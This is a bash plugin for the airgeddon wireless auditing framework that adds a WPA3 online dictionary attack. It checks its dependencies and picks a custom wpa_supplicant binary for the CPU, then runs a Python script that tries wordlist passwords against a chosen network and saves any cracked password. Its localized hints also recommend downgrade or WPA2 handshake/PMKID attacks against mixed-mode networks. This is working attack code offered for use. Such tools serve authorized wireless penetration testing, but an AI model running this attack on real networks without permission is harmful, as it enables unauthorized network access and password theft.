#!/usr/bin/env bash

#Global shellcheck disabled warnings
#shellcheck disable=SC2034,SC2154

plugin_name="WPA3 online attack"
plugin_description="A plugin to perform an online dictionary attack over WPA3 wireless networks"
plugin_author="OscarAkaElvis"

#This plugin is based in the Wacker script. Credits to the authors: https://github.com/blunderbuss-wctf/wacker

plugin_enabled=1

plugin_minimum_ag_affected_version="11.52"
plugin_maximum_ag_affected_version=""
plugin_distros_supported=("*")

#Custom function. Channel mappings to frequency
function custom_channel_mappings() {

	debug_print

	declare -gA channels_to_freq_correspondence

	channels_to_freq_correspondence["1"]="2412"
	channels_to_freq_correspondence["2"]="2417"
	channels_to_freq_correspondence["3"]="2422"
	channels_to_freq_correspondence["4"]="2427"
	channels_to_freq_correspondence["5"]="2432"
	channels_to_freq_correspondence["6"]="2437"
	channels_to_freq_correspondence["7"]="2442"
	channels_to_freq_correspondence["8"]="2447"
	channels_to_freq_correspondence["9"]="2452"
	channels_to_freq_correspondence["10"]="2457"
	channels_to_freq_correspondence["11"]="2462"
	channels_to_freq_correspondence["12"]="2467"
	channels_to_freq_correspondence["13"]="2472"
	channels_to_freq_correspondence["14"]="2484"
	channels_to_freq_correspondence["36"]="5180"
	channels_to_freq_correspondence["40"]="5200"
	channels_to_freq_correspondence["44"]="5220"
	channels_to_freq_correspondence["48"]="5240"
	channels_to_freq_correspondence["52"]="5260"
	channels_to_freq_correspondence["56"]="5280"
	channels_to_freq_correspondence["60"]="5300"
	channels_to_freq_correspondence["64"]="5320"
	channels_to_freq_correspondence["100"]="5500"
	channels_to_freq_correspondence["104"]="5520"
	channels_to_freq_correspondence["108"]="5540"
	channels_to_freq_correspondence["112"]="5560"
	channels_to_freq_correspondence["116"]="5580"
	channels_to_freq_correspondence["120"]="5600"
	channels_to_freq_correspondence["124"]="5620"
	channels_to_freq_correspondence["128"]="5640"
	channels_to_freq_correspondence["132"]="5660"
	channels_to_freq_correspondence["136"]="5680"
	channels_to_freq_correspondence["140"]="5700"
	channels_to_freq_correspondence["144"]="5720"
	channels_to_freq_correspondence["149"]="5745"
	channels_to_freq_correspondence["153"]="5765"
	channels_to_freq_correspondence["157"]="5785"
	channels_to_freq_correspondence["161"]="5805"
	channels_to_freq_correspondence["165"]="5825"
}

#Custom function. Validate if right custom wpa_supplicant binary file exist
function custom_wpa_supplicant_validation() {

	debug_print

	custom_wpa_supplicant_binaries_dir="wpa_supplicant_binaries/"

	if [ "${is_arm}" -eq 1 ]; then
		if uname -m | grep -Ei "armv6l|armv7l" > /dev/null; then
			if ! [ -f "${scriptfolder}${plugins_dir}${custom_wpa_supplicant_binaries_dir}wpa_supplicant_armhf" ]; then
				echo
				language_strings "${language}" "wpa3_online_attack_4" "red"
				language_strings "${language}" 115 "read"
				return 1
			else
				custom_wpa_supplicant_binary_path="${scriptfolder}${plugins_dir}${custom_wpa_supplicant_binaries_dir}wpa_supplicant_armhf"
			fi
		elif uname -m | grep -Ei "aarch64|aarch64_be|armv8b|armv8l" > /dev/null; then
			if ! [ -f "${scriptfolder}${plugins_dir}${custom_wpa_supplicant_binaries_dir}wpa_supplicant_arm64" ]; then
				echo
				language_strings "${language}" "wpa3_online_attack_4" "red"
				language_strings "${language}" 115 "read"
				return 1
			else
				custom_wpa_supplicant_binary_path="${scriptfolder}${plugins_dir}${custom_wpa_supplicant_binaries_dir}wpa_supplicant_arm64"
			fi
		else
			if ! [ -f "${scriptfolder}${plugins_dir}${custom_wpa_supplicant_binaries_dir}wpa_supplicant_armel" ]; then
				echo
				language_strings "${language}" "wpa3_online_attack_4" "red"
				language_strings "${language}" 115 "read"
				return 1
			else
				custom_wpa_supplicant_binary_path="${scriptfolder}${plugins_dir}${custom_wpa_supplicant_binaries_dir}wpa_supplicant_armel"
			fi
		fi
	else
		if uname -m | grep -Ei "x86_64" > /dev/null; then
			if ! [ -f "${scriptfolder}${plugins_dir}${custom_wpa_supplicant_binaries_dir}wpa_supplicant_amd64" ]; then
				echo
				language_strings "${language}" "wpa3_online_attack_4" "red"
				language_strings "${language}" 115 "read"
				return 1
			else
				custom_wpa_supplicant_binary_path="${scriptfolder}${plugins_dir}${custom_wpa_supplicant_binaries_dir}wpa_supplicant_amd64"
			fi
		else
			if ! [ -f "${scriptfolder}${plugins_dir}${custom_wpa_supplicant_binaries_dir}wpa_supplicant_i386" ]; then
				echo
				language_strings "${language}" "wpa3_online_attack_4" "red"
				language_strings "${language}" 115 "read"
				return 1
			else
				custom_wpa_supplicant_binary_path="${scriptfolder}${plugins_dir}${custom_wpa_supplicant_binaries_dir}wpa_supplicant_i386"
			fi
		fi
	fi

	chmod +x "${custom_wpa_supplicant_binary_path}" 2> /dev/null

	return 0
}

#Custom function. Execute WPA3 online dictionary attack
function exec_wpa3_online_dictionary_attack() {

	debug_print

	freq="${channels_to_freq_correspondence[${channel}]}"

	rm -rf "${tmpdir}agwpa3"* > /dev/null 2>&1
	mkdir "${tmpdir}agwpa3" > /dev/null 2>&1

	recalculate_windows_sizes
	manage_output "+j -bg \"#000000\" -fg \"#FFC0CB\" -geometry ${g1_topright_window} -T \"wpa3 online dictionary attack\"" "${python3} ${scriptfolder}${plugins_dir}wpa3_online_attack.py ${DICTIONARY} ${essid} ${bssid} ${interface} ${freq} ${custom_wpa_supplicant_binary_path} ${tmpdir}agwpa3 ${language} | tee ${tmpdir}agwpa3/${wpa3log_file} ${colorize}" "wpa3 online dictionary attack" "active"
	wait_for_process "${python3} ${scriptfolder}${plugins_dir}wpa3_online_attack.py ${DICTIONARY} ${essid} ${bssid} ${interface} ${freq} ${custom_wpa_supplicant_binary_path} ${tmpdir}agwpa3 ${language}" "wpa3 online dictionary attack"

	manage_wpa3_pot
}

#Custom function. Validate if the needed plugin python file exists
function python3_wpa3_online_attack_script_validation() {

	debug_print

	if ! [ -f "${scriptfolder}${plugins_dir}wpa3_online_attack.py" ]; then
		echo
		language_strings "${language}" "wpa3_online_attack_3" "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	return 0
}

#Custom function. Validate if the system has python3.1+ installed and set python launcher
function python3_wpa3_online_attack_validation() {

	debug_print

	if ! hash python3 2> /dev/null; then
		if ! hash python 2> /dev/null; then
			echo
			language_strings "${language}" "wpa3_online_attack_2" "red"
			language_strings "${language}" 115 "read"
			return 1
		else
			python_version=$(python -V 2>&1 | sed 's/.* \([0-9]\).\([0-9]\).*/\1\2/')
			if [ "${python_version}" -lt "31" ]; then
				echo
				language_strings "${language}" "wpa3_online_attack_2" "red"
				language_strings "${language}" 115 "read"
				return 1
			fi
			python3="python"
		fi
	else
		python_version=$(python3 -V 2>&1 | sed 's/.* \([0-9]\).\([0-9]\).*/\1\2/')
		if [ "${python_version}" -lt "31" ]; then
			echo
			language_strings "${language}" "wpa3_online_attack_2" "red"
			language_strings "${language}" 115 "read"
			return 1
		fi
		python3="python3"
	fi

	return 0
}

#Custom function. Check if the wpa3 password was captured and manage to save it on a file
function manage_wpa3_pot() {

	debug_print

	local wpa3_pass_cracked=0
	if grep -Eq "^Password found:" "${tmpdir}agwpa3/${wpa3log_file}" 2> /dev/null; then
		sed -ri '0,/BRUTE ATTEMPT SUCCESS/d' "${tmpdir}agwpa3/${wpa3log_file}" 2> /dev/null
		readarray -t LINES_TO_PARSE < <(cat < "${tmpdir}agwpa3/${wpa3log_file}" 2> /dev/null)
		for item in "${LINES_TO_PARSE[@]}"; do
			if [[ "${item}" =~ ^Password[[:blank:]]found:[[:blank:]](.*)$ ]]; then
				wpa3_password="${BASH_REMATCH[1]}"
				wpa3_pass_cracked=1
				break
			fi
		done
	fi

	if [ "${wpa3_pass_cracked}" -eq 1 ]; then
		echo "" > "${wpa3potenteredpath}"
		{
		date +%Y-%m-%d
		echo -e "${arr[${language},760]}"
		echo ""
		echo -e "BSSID: ${bssid}"
		echo -e "${et_misc_texts[${language},1]}: ${channel}"
		echo -e "ESSID: ${essid}"
		echo ""
		echo "---------------"
		echo ""
		echo -e "${wpa3_password}"
		echo ""
		echo "---------------"
		echo ""
		echo "${footer_texts[${language},0]}"
		} >> "${wpa3potenteredpath}"

		echo
		language_strings "${language}" 162 "yellow"
		echo
		language_strings "${language}" 761 "blue"
		language_strings "${language}" 115 "read"
	fi
}

#Custom function. Check if the password was captured using wpa3 attack and manage to save it on a file
function manage_wpa3_log() {

	debug_print

	wpa3_potpath="${default_save_path}"
	wpa3pot_filename="wpa3_password-${essid}.txt"
	wpa3_potpath="${wpa3_potpath}${wpa3pot_filename}"

	validpath=1
	while [[ "${validpath}" != "0" ]]; do
		read_path "wpa3pot"
	done
}

#Custom function. Prepare WPA3 online dictionary attack
function wpa3_online_dictionary_attack_option() {

	debug_print

	get_aircrack_version

	if ! validate_aircrack_wpa3_version; then
		echo
		language_strings "${language}" 763 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	if [[ -z ${bssid} ]] || [[ -z ${essid} ]] || [[ -z ${channel} ]] || [[ "${essid}" = "(Hidden Network)" ]]; then
		echo
		language_strings "${language}" 125 "yellow"
		language_strings "${language}" 115 "read"
		if ! explore_for_targets_option "WPA3"; then
			return 1
		fi
	fi

	if check_monitor_enabled "${interface}"; then
		echo
		language_strings "${language}" "wpa3_online_attack_5" "yellow"
		echo
		language_strings "${language}" 115 "read"
		echo
		managed_option "${interface}"
	fi

	if ! validate_wpa3_network; then
		return 1
	fi

	if ! validate_network_type "personal"; then
		return 1
	fi

	manage_asking_for_dictionary_file

	if ! python3_wpa3_online_attack_validation; then
		return 1
	fi

	if ! python3_wpa3_online_attack_script_validation; then
		return 1
	fi

	if ! custom_wpa_supplicant_validation; then
		return 1
	fi

	wpa3log_file="ag.wpa3.log"
	custom_channel_mappings

	manage_wpa3_log

	echo
	language_strings "${language}" 32 "green"
	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"

	exec_wpa3_online_dictionary_attack
}

#Prehook hookable_wpa3_attacks_menu function to modify wpa3 menu options
function wpa3_online_attack_prehook_hookable_wpa3_attacks_menu() {

	if [ "${arr['ENGLISH',756]}" = "5.  WPA3 online dictionary attack" ]; then
		plugin_x="wpa3_online_dictionary_attack_option"
		plugin_x_under_construction=""
	elif [ "${arr['ENGLISH',757]}" = "6.  WPA3 online dictionary attack" ]; then
		plugin_y="wpa3_online_dictionary_attack_option"
		plugin_y_under_construction=""
	fi
}

#Prehook for hookable_for_languages function to modify language strings
#shellcheck disable=SC1111
function wpa3_online_attack_prehook_hookable_for_languages() {

	if [ "${arr['ENGLISH',756]}" = "5.  WPA3 attack (use a plugin here)" ]; then
		arr["ENGLISH",756]="5.  WPA3 online dictionary attack"
		arr["SPANISH",756]="5.  Ataque de diccionario online de WPA3"
		arr["FRENCH",756]="5.  Attaque online WPA3 avec dictionaire"
		arr["CATALAN",756]="5.  Atac de diccionari en línia de WPA3"
		arr["PORTUGUESE",756]="5.  Ataque online de dicionário no WPA3"
		arr["RUSSIAN",756]="5.  Онлайн атака на WPA3 со словарём"
		arr["GREEK",756]="5.  Διαδικτυακή επίθεση σε WPA3 με λεξικό"
		arr["ITALIAN",756]="5.  Attacco online WPA3 con dizionario"
		arr["POLISH",756]="5.  Atak słownikowy online WPA3"
		arr["GERMAN",756]="5.  WPA3-Angriff auf das Online-Wörterbuch"
		arr["TURKISH",756]="5.  WPA3 çevrimiçi sözlük saldırısı"
		arr["ARABIC",756]="5.  WPA3 قاموس الهجوم علي الشبكة ل"
		arr["CHINESE",756]="5.  WPA3 在线字典攻击"
	elif [ "${arr['ENGLISH',757]}" = "6.  WPA3 attack (use a plugin here)" ]; then
		arr["ENGLISH",757]="6.  WPA3 online dictionary attack"
		arr["SPANISH",757]="6.  Ataque de diccionario online de WPA3"
		arr["FRENCH",757]="6.  Attaque online WPA3 avec dictionaire"
		arr["CATALAN",757]="6.  Atac de diccionari en línia de WPA3"
		arr["PORTUGUESE",757]="6.  Ataque online de dicionário no WPA3"
		arr["RUSSIAN",757]="6.  Онлайн атака на WPA3 со словарём"
		arr["GREEK",757]="6.  Διαδικτυακή επίθεση σε WPA3 με λεξικό"
		arr["ITALIAN",757]="6.  Attacco online WPA3 con dizionario"
		arr["POLISH",757]="6.  Atak słownikowy online WPA3"
		arr["GERMAN",757]="6.  WPA3-Angriff auf das Online-Wörterbuch"
		arr["TURKISH",757]="6.  WPA3 çevrimiçi sözlük saldırısı"
		arr["ARABIC",757]="6.  WPA3 قاموس الهجوم علي الشبكة ل"
		arr["CHINESE",757]="6.  WPA3 在线字典攻击"
	fi

	arr["ENGLISH","wpa3_online_attack_1"]="WPA3 online dictionary attacks take significantly longer than offline cracking, so they should be performed only against pure WPA3 networks. If the target is a WPA2/WPA3 Transitional (Mixed mode) network, prefer traditional WPA2 techniques (Handshake, PMKID) or a downgrade attack rather than attempting the slow online WPA3 attack"
	arr["SPANISH","wpa3_online_attack_1"]="Los ataques de diccionario online contra WPA3 tardan mucho más que el cracking offline, por lo que debes realizarlos solo contra redes puramente WPA3. Si el objetivo es una WPA2/WPA3 Transitional (Mixed mode), prefiere las técnicas tradicionales de WPA2 (Handshake, PMKID) o un ataque de downgrade en lugar de intentar el lento ataque WPA3 online"
	arr["FRENCH","wpa3_online_attack_1"]="\${pending_of_translation} Les attaques par dictionnaire en ligne contre WPA3 prennent beaucoup plus de temps que le craquage hors ligne, elles doivent donc être effectuées uniquement contre des réseaux purement WPA3. Si la cible est une WPA2/WPA3 Transitional (Mixed mode), privilégie les techniques WPA2 traditionnelles (Handshake, PMKID) ou une attaque de downgrade plutôt que d'essayer la lente attaque WPA3 en ligne"
	arr["CATALAN","wpa3_online_attack_1"]="\${pending_of_translation} Els atacs de diccionari en línia contra WPA3 triguen molt més que el craqueig offline, així que només els has de fer contra xarxes purament WPA3. Si l'objectiu és una WPA2/WPA3 Transitional (Mixed mode), prefereix les tècniques tradicionals de WPA2 (Handshake, PMKID) o un atac de downgrade en lloc d'intentar el lent atac WPA3 online"
	arr["PORTUGUESE","wpa3_online_attack_1"]="\${pending_of_translation} Os ataques de dicionário online contra WPA3 demoram muito mais do que o cracking offline, por isso só deves realizá-los contra redes puramente WPA3. Se o alvo for uma WPA2/WPA3 Transitional (Mixed mode), prefere técnicas tradicionais de WPA2 (Handshake, PMKID) ou um ataque de downgrade em vez de tentar o lento ataque WPA3 online"
	arr["RUSSIAN","wpa3_online_attack_1"]="\${pending_of_translation} Онлайн-атаки словарём против WPA3 занимают значительно больше времени, чем офлайн-взлом, поэтому их следует выполнять только против чистых сетей WPA3. Если целью является WPA2/WPA3 Transitional (Mixed mode), предпочитай традиционные приёмы WPA2 (Handshake, PMKID) или атаку по понижению версии вместо попытки медленной онлайн-атаки WPA3"
	arr["GREEK","wpa3_online_attack_1"]="\${pending_of_translation} Οι επιθέσεις λεξικού online κατά του WPA3 διαρκούν πολύ περισσότερο από το cracking offline, οπότε πρέπει να γίνονται μόνο σε καθαρά δίκτυα WPA3. Εάν ο στόχος είναι μια WPA2/WPA3 Transitional (Mixed mode), προτίμησε τις παραδοσιακές τεχνικές WPA2 (Handshake, PMKID) ή μια επίθεση downgrade αντί να προσπαθήσεις την αργή online επίθεση WPA3"
	arr["ITALIAN","wpa3_online_attack_1"]="\${pending_of_translation} Gli attacchi dizionario online contro WPA3 richiedono molto più tempo rispetto al cracking offline, quindi dovresti eseguirli solo contro reti puramente WPA3. Se l'obiettivo è una WPA2/WPA3 Transitional (Mixed mode), preferisci le tecniche tradizionali WPA2 (Handshake, PMKID) o un attacco di downgrade invece di tentare il lento attacco WPA3 online"
	arr["POLISH","wpa3_online_attack_1"]="\${pending_of_translation} Ataki słownikowe online na WPA3 zajmują znacznie więcej czasu niż łamanie offline, dlatego powinny być wykonywane tylko przeciwko czystym sieciom WPA3. Jeśli celem jest sieć WPA2/WPA3 Transitional (Mixed mode), preferuj tradycyjne techniki WPA2 (Handshake, PMKID) lub atak downgrade zamiast próby powolnego ataku WPA3 online"
	arr["GERMAN","wpa3_online_attack_1"]="\${pending_of_translation} WPA3 Online-Dictionary-Angriffe dauern deutlich länger als Offline-Cracking, daher sollten sie nur gegen reine WPA3-Netzwerke durchgeführt werden. Wenn das Ziel eine WPA2/WPA3 Transitional (Mixed mode) ist, verwende bevorzugt traditionelle WPA2-Techniken (Handshake, PMKID) oder einen Downgrade-Angriff anstelle des langsamen Online-WPA3-Angriffs"
	arr["TURKISH","wpa3_online_attack_1"]="\${pending_of_translation} WPA3'e yönelik çevrimiçi sözlük saldırıları, çevrimdışı kırmadan çok daha uzun sürer; bu yüzden yalnızca saf WPA3 ağlarına karşı gerçekleştirilmelidir. Hedef bir WPA2/WPA3 Transitional (Mixed mode) ise yavaş çevrimiçi WPA3 saldırısını denemek yerine geleneksel WPA2 tekniklerini (Handshake, PMKID) veya bir downgrade saldırısını tercih et"
	arr["ARABIC","wpa3_online_attack_1"]="\${pending_of_translation} تستغرق هجمات القاموس عبر الإنترنت ضد WPA3 وقتًا أطول بكثير من الكسر دون اتصال، لذلك يجب تنفيذها فقط ضد شبكات WPA3 النقية. إذا كان الهدف شبكة WPA2/WPA3 Transitional (Mixed mode)، ففضل تقنيات WPA2 التقليدية (Handshake, PMKID) أو هجوم خفض الإصدار بدلاً من محاولة الهجوم البطيء WPA3 عبر الإنترنت"
	arr["CHINESE","wpa3_online_attack_1"]="\${pending_of_translation} 针对 WPA3 的在线字典攻击比离线破解需要的时间长得多，因此应仅针对纯 WPA3 网络执行。如果目标是 WPA2/WPA3 Transitional (Mixed mode)，优先使用传统的 WPA2 技术（Handshake, PMKID）或降级攻击，而不是尝试缓慢的在线 WPA3 攻击"
	wpa3_hints+=("wpa3_online_attack_1")

	arr["ENGLISH","wpa3_online_attack_2"]="This attack requires to have python3.1+ installed on your system"
	arr["SPANISH","wpa3_online_attack_2"]="Este ataque requiere tener python3.1+ instalado en el sistema"
	arr["FRENCH","wpa3_online_attack_2"]="Cette attaque a besoin de python3.1+ installé sur le système"
	arr["CATALAN","wpa3_online_attack_2"]="Aquest atac requereix tenir python3.1+ instal·lat al sistema"
	arr["PORTUGUESE","wpa3_online_attack_2"]="Este ataque necessita do python3.1+ instalado no sistema"
	arr["RUSSIAN","wpa3_online_attack_2"]="Для этой атаки необходимо, чтобы в системе был установлен python3.1+"
	arr["GREEK","wpa3_online_attack_2"]="Αυτή η επίθεση απαιτεί την εγκατάσταση python3.1+ στο σύστημά σας"
	arr["ITALIAN","wpa3_online_attack_2"]="Questo attacco richiede che python3.1+ sia installato nel sistema"
	arr["POLISH","wpa3_online_attack_2"]="Ten atak wymaga zainstalowania w systemie python3.1+"
	arr["GERMAN","wpa3_online_attack_2"]="Für diesen Angriff muss python3.1+ auf dem System installiert sein"
	arr["TURKISH","wpa3_online_attack_2"]="Bu saldırı için sisteminizde, python3.1+'ün kurulu olmasını gereklidir"
	arr["ARABIC","wpa3_online_attack_2"]="على النظام python3.1+ يتطلب هذا الهجوم تثبيت"
	arr["CHINESE","wpa3_online_attack_2"]="此攻击需要在您的系统上安装 python3.1+"

	arr["ENGLISH","wpa3_online_attack_3"]="The python3 script required as part of this plugin to run this attack is missing. Please make sure that the file \"\${normal_color}wpa3_online_attack.py\${red_color}\" exists and that it is in the plugins dir next to the \"\${normal_color}wpa3_online_attack.sh\${red_color}\" file"
	arr["SPANISH","wpa3_online_attack_3"]="El script de python3 requerido como parte de este plugin para ejecutar este ataque no se encuentra. Por favor, asegúrate de que existe el fichero \"\${normal_color}wpa3_online_attack.py\${red_color}\" y que está en la carpeta de plugins junto al fichero \"\${normal_color}wpa3_online_attack.sh\${red_color}\""
	arr["FRENCH","wpa3_online_attack_3"]="Le script de python3 requis dans cet plugin pour exécuter cette attaque est manquant. Assurez-vous que le fichier \"\${normal_color}wpa3_online_attack.py\${red_color}\" existe et qu'il se trouve dans le dossier plugins à côté du fichier \"\${normal_color}wpa3_online_attack.sh\${red_color}\""
	arr["CATALAN","wpa3_online_attack_3"]="El script de python3 requerit com a part d'aquest plugin per executar aquest atac no es troba. Assegureu-vos que existeix el fitxer \"\${normal_color}wpa3_online_attack.py\${red_color}\" i que està a la carpeta de plugins al costat del fitxer \"\${normal_color}wpa3_online_attack.sh\${red_color}\""
	arr["PORTUGUESE","wpa3_online_attack_3"]="O arquivo python para executar este ataque está ausente. Verifique se o arquivo \"\${normal_color}wpa3_online_attack.py\${red_color}\" existe e se está na pasta de plugins com o arquivo \"\${normal_color}wpa3_online_attack.sh\${red_color}\""
	arr["RUSSIAN","wpa3_online_attack_3"]="Скрипт, необходимый этому плагину для запуска этой атаки, отсутствует. Убедитесь, что файл \"\${normal_color}wpa3_online_attack.py\${red_color}\" существует и находится в папке для плагинов рядом с файлом \"\${normal_color}wpa3_online_attack.sh\${red_color}\"."
	arr["GREEK","wpa3_online_attack_3"]="Το python3 script που απαιτείται ως μέρος αυτής της προσθήκης για την εκτέλεση αυτής της επίθεσης λείπει. Βεβαιωθείτε ότι το αρχείο \"\${normal_color}wpa3_online_attack.py\${red_color}\" υπάρχει και ότι βρίσκεται στον φάκελο plugins δίπλα στο αρχείο \"\${normal_color}wpa3_online_attack.sh\${red_color}\""
	arr["ITALIAN","wpa3_online_attack_3"]="Lo script python3 richiesto come parte di questo plugin per eseguire questo attacco è assente. Assicurati che il file \"\${normal_color}wpa3_online_attack.py\${red_color}\" esista e che sia nella cartella dei plugin assieme al file \"\${normal_color}wpa3_online_attack.sh\${red_color}\""
	arr["POLISH","wpa3_online_attack_3"]="Do uruchomienia tego ataku brakuje skryptu python3 wymaganego jako część pluginu. Upewnij się, że plik \"\${normal_color}wpa3_online_attack.py\${red_color}\" istnieje i znajduje się w folderze pluginów obok pliku \"\${normal_color}wpa3_online_attack.sh\${red_color}\""
	arr["GERMAN","wpa3_online_attack_3"]="Das python3-Skript, das als Teil dieses Plugins erforderlich ist, um diesen Angriff auszuführen, fehlt. Bitte stellen Sie sicher, dass die Datei \"\${normal_color}wpa3_online_attack.py\${red_color}\" vorhanden ist und dass sie sich im Plugin-Ordner neben der Datei \"\${normal_color}wpa3_online_attack.sh\${red_color}\" befindet"
	arr["TURKISH","wpa3_online_attack_3"]="Bu saldırıyı çalıştırmak için bu eklentinin bir parçası olarak gereken python3 komutu dosyası eksik. Lütfen, eklentiler klasöründe \"\${normal_color}wpa3_online_attack.sh\${red_color}\" dosyasının yanında, \"\${normal_color}wpa3_online_attack.py\${red_color}\" dosyasının da var olduğundan emin olun"
	arr["ARABIC","wpa3_online_attack_3"]="\"\${normal_color}wpa3_online_attack.sh\${red_color}\" موجود وأنه موجود في مجلد المكونات الإضافية بجوار الملف \"\${normal_color}wpa3_online_attack.py\${red_color}\" المطلوب كجزء من هذا البرنامج المساعد لتشغيل هذا الهجوم مفقود. يرجى التأكد من أن الملف pyhton3 سكربت"
	arr["CHINESE","wpa3_online_attack_3"]="作为此插件的一部分运行此攻击所需的 python3 脚本丢失。请确保文件 \"\${normal_color}wpa3_online_attack.py\${red_color}\" 存在，并且位于 \"\${normal_color}wpa3_online_attack.sh\${red_color}\" 旁边的插件目录中 文件"

	arr["ENGLISH","wpa3_online_attack_4"]="The precompiled custom wpa_supplicant binary file needed to execute this attack is missing. Please make sure that the binary according to your processor architecture exists in the \"\${normal_color}wpa_supplicant_binaries\${red_color}\" dir which is inside the plugins dir"
	arr["SPANISH","wpa3_online_attack_4"]="El fichero binario personalizado y precompilado de wpa_supplicant necesario para ejecutar este ataque no se encuentra. Por favor, asegúrate de que existe el binario acorde a to arquitectura de procesador existe en la carpeta \"\${normal_color}wpa_supplicant_binaries\${red_color}\" dentro de la carpeta de plugins"
	arr["FRENCH","wpa3_online_attack_4"]="Le fichier binaire personnalisé précompilé de wpa_supplicant nécessaire pour exécuter cette attaque est manquant. Assurez-vous que le binaire correspondant à l'architecture de votre processeur existe dans le dossier \"\${normal_color}wpa_supplicant_binaries\${red_color}\" à l'intérieur du dossier des plugins"
	arr["CATALAN","wpa3_online_attack_4"]="El fitxer binari personalitzat i precompilat de wpa_supplicant necessari per executar aquest atac no es troba. Assegureu-vos que existeix el binari d'acord amb l'arquitectura de processador a la carpeta \"\${normal_color}wpa_supplicant_binaries\${red_color}\" dins de la carpeta de connectors"
	arr["PORTUGUESE","wpa3_online_attack_4"]="O arquivo pré-compilado do wpa_supplicant está ausente. Certifique-se de que o binário \"\${normal_color}wpa_supplicant_binaries\${red_color}\" de acordo com a arquitetura do seu processador exista dentro da pasta de plugins"
	arr["RUSSIAN","wpa3_online_attack_4"]="Пользовательский wpa_supplicant, необходимый для выполнения этой атаки, отсутствует. Убедитесь, что файл, соответствующий архитектуре вашего процессора, существует в папке \"\${normal_color}wpa_supplicant_binaries\${red_color}\" внутри папки для плагинов."
	arr["GREEK","wpa3_online_attack_4"]="Το προμεταγλωττισμένο προσαρμοσμένο δυαδικό αρχείο του wpa_supplicant που απαιτείται για την εκτέλεση αυτής της επίθεσης λείπει. Βεβαιωθείτε ότι το δυαδικό αρχείο σύμφωνα με την αρχιτεκτονική του επεξεργαστή σας υπάρχει στο φάκελο \"\${normal_color}wpa_supplicant_binaries\${red_color}\" μέσα στο φάκελο plugins"
	arr["ITALIAN","wpa3_online_attack_4"]="Manca il file personalizzato e precompilato di wpa_supplicant necessario per eseguire questo attacco. Assicurati che il file appropiato in base all'architettura del tuo processore esista nella cartella \"\${normal_color}wpa_supplicant_binaries\${red_color}\" all'interno della cartella dei plugin"
	arr["POLISH","wpa3_online_attack_4"]="Brakuje prekompilowanego niestandardowego pliku binarnego wpa_supplicant potrzebnego do wykonania tego ataku. Upewnij się, że plik binarny zgodnie z architekturą twojego procesora znajduje się w folderze pluginów \"\${normal_color}wpa_supplicant_binaries\${red_color}\""
	arr["GERMAN","wpa3_online_attack_4"]="Die vorkompilierte benutzerdefinierte Binärdatei von wpa_supplicant, die zur Ausführung dieses Angriffs benötigt wird, fehlt. Bitte stellen Sie sicher, dass die Binärdatei entsprechend Ihrer Prozessorarchitektur im Ordner \"\${normal_color}wpa_supplicant_binaries\${red_color}\" innerhalb des Plugins-Ordners vorhanden ist"
	arr["TURKISH","wpa3_online_attack_4"]="Bu saldırıyı gerçekleştirmek için gereken wpa_supplicant'ın önceden derlenmiş özel ikili dosyası eksik. Lütfen işlemci mimarinize göre bu ikili dosyanın, eklentiler klasörünün içindeki \"\${normal_color}wpa_supplicant_binaries\${red_color}\" klasöründe bulunduğundan emin olun"
	arr["ARABIC","wpa3_online_attack_4"]="داخل مجلد المكونات الإضافية \"\${normal_color}wpa_supplicant_binaries\${red_color}\" المطلوب لتنفيذ هذا الهجوم مفقود. الرجاء التأكد من وجود الملف الثنائي وفقًا لبنية المعالج في المجلد wpa_supplicant الملف الثنائي المخصص المترجم مسبقًا لـ"
	arr["CHINESE","wpa3_online_attack_4"]="执行此攻击所需的预编译自定义 wpa_supplicant 二进制文件丢失。请确保符合您的处理器架构的二进制文件存在于插件目录内的 \"\${normal_color}wpa_supplicant_binaries\${red_color}\" 目录中"

	arr["ENGLISH","wpa3_online_attack_5"]="To launch this attack, the card must be in \"Managed\" mode. It has been detected that your card is in \"Monitor\" mode, so airgeddon will automatically change it to be able to carry out the attack"
	arr["SPANISH","wpa3_online_attack_5"]="Para lanzar este ataque es necesario que la tarjeta esté en modo \"Managed\". Se ha detectado que tu tarjeta está en modo \"Monitor\" por lo que airgeddon la cambiará automáticamente para poder realizar el ataque"
	arr["FRENCH","wpa3_online_attack_5"]="Pour lancer cette attaque, la carte doit être en mode \"Managed\". Il a été détecté que votre carte est en mode \"Monitor\", donc airgeddon la changera automatiquement pour pouvoir mener l'attaque"
	arr["CATALAN","wpa3_online_attack_5"]="Per llançar aquest atac cal que la targeta estigui en mode \"Managed\". S'ha detectat que la teva targeta està en mode \"Monitor\" pel que airgeddon la canviarà automàticament per poder realitzar l'atac"
	arr["PORTUGUESE","wpa3_online_attack_5"]="Para iniciar este ataque a interface deve estar no modo \"Managed\". Foi detectado que sua interface está no modo \"Monitor\", o airgeddon irá alterá-la automaticamente para poder prosseguir com o ataque"
	arr["RUSSIAN","wpa3_online_attack_5"]="Для запуска этой атаки сетевая карта должна находиться в режиме \"Managed\". Ваша карта находится в режиме \"Monitor\", airgeddon автоматически поменяет режим, чтобы иметь возможность провести атаку"
	arr["GREEK","wpa3_online_attack_5"]="Για να ξεκινήσει αυτή η επίθεση, η κάρτα πρέπει να βρίσκεται σε λειτουργία \"Managed\". Έχει εντοπιστεί ότι η κάρτα σας βρίσκεται σε λειτουργία \"Monitor\", επομένως το airgeddon θα την αλλάξει αυτόματα για να μπορέσει να πραγματοποιήσει την επίθεση"
	arr["ITALIAN","wpa3_online_attack_5"]="Per lanciare questo attacco, la scheda deve essere in modalità \"Managed\". È stato rilevato che la tua scheda è in modalità \"Monitor\", quindi airgeddon la cambierà automaticamente per poter eseguire l'attacco"
	arr["POLISH","wpa3_online_attack_5"]="Aby przeprowadzić ten atak, karta musi być w trybie \"Managed\". Wykryto, że twoja karta jest w trybie \"Monitor\", więc aby móc przeprowadzić atak airgeddon automatycznie go zmieni"
	arr["GERMAN","wpa3_online_attack_5"]="Um diesen Angriff zu starten, muss sich die Karte im \"Managed\"-Modus befinden. Es wurde festgestellt, dass Ihre Karte im \"Monitor\"-Modus ist, also wird airgeddon sie automatisch ändern, um den Angriff ausführen zu können"
	arr["TURKISH","wpa3_online_attack_5"]="Bu saldırıyı başlatmak için kartın \"Managed\" modunda olması gerekir. Kartınızın \"Monitor\" modunda olduğu tespit edildi, bu nedenle airgeddon saldırıyı gerçekleştirebilmek için kartı otomatik olarak değiştirecektir."
